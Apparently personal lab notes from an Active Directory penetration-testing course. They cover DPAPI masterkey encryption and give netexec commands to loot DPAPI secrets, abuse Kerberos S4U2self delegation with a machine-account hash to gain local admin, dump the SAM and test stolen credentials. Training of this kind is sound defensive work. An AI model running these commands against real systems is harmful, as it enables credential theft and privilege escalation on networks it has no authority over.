Secrets are encrypted with a masterkey
- masterkey is encrypted with 
	- user's password
	- stored in LSA
	- Domain Backupkey
- scenarios
	- decrypt user secrets with its password
	- decrypt system secrets with local admin
	- decrypt everything with domain admin 


**DPAPI - dploot**
python tool for looting DPAPI remote or locally

netexec integration
`nxc smb <IP> -u <user> -p <pass> --dpapi`



### Learning Objective 20

**Abusing Kerberos delegation (S4U2self) to become local admin**
`nxc smb 172.16.13.24 -u ROBOOPS01$ -H <hash> --delegate Administrator --self`
![](assets/Pasted%20image%2020260724105607.png)



**Extract stored DPAPI creds from the scheduled task on the ROBOOPS01 machine**
`nxc smb 172.16.13.24 -u ROBOOPS01$ -H <hash> --delegate Administrator --self --dpapi`
- if that doesn't work, dump the SAM first with `--sam` and just use local admin directly
![](assets/Pasted%20image%2020260724105713.png)

verify new creds
`nxc smb 172.16.13.1 -u ryan.young -p <pass>`
![](assets/Pasted%20image%2020260724105813.png)

